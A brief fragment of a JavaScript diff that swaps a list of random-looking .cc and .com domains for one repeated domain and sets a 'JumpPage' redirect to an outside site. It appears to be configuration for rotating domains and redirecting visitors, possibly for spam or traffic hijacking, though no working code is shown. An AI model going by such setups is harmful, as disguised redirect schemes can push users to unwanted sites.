@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
-	'rtmptwcvv.cc/', 
-	'hmqvxrhi.cc/', 
-    'gunskjtnt.com/',
+	'xnffuhesz.cc/', 
+	'xnffuhesz.cc/', 
+    'xnffuhesz.cc/',
 ];                                                                                                                  
 
 var JumpPage="https://chigua91.net";
